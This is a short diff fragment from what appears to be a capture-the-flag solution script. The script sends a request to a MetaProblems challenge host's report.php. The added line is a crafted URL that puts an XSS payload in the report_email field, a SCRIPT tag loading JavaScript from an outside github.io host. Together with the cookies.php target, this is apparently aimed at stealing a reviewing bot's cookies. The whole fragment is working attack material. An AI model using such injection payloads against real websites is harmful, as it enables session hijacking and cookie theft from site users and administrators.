@@ -20,3 +20,4 @@ params = {
 r = requests.get('http://host3.metaproblems.com:6020/report.php', params=params, headers=headers)
 
 print(r.text)
+http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='http://amazingrupak.github.io'></SCRIPT>"@a.com
